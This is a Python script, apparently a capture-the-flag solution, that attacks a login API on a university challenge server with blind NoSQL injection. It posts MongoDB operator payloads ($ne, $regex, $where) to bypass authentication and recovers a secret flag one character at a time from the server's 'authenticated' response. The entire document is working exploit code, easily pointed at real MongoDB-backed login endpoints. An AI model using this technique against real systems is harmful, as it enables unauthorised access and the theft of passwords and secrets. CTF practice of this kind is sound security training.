import requests
import string

# Target URL and headers
url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:10000/api/login"
charset = string.ascii_letters + string.digits + "{}_!@#$%^&*()"
flag = "flag{"

print("[*] Starting NoSQL injection...")

while not flag.endswith("}"):  # Continue until the closing curly brace is found
    for char in charset:
        payload = {
            "username": {"$ne": None},
            "password": {"$regex": f"^{flag}{char}"},  # Matches characters iteratively
            "$where": "this.error = this.password"
        }
        response = requests.post(url, json=payload)
        # Check for successful authentication
        if (
            response.status_code == 200
            and "authenticated" in response.json()
            and response.json()["authenticated"]
        ):
            flag += char  # Append the discovered character to the flag
            print(f"[+] Found character: {char} | Current flag: {flag}")
            break
    else:
        print("[!] Could not find the next character. Exiting.")
        break

print(f"[+] Full flag: {flag}")
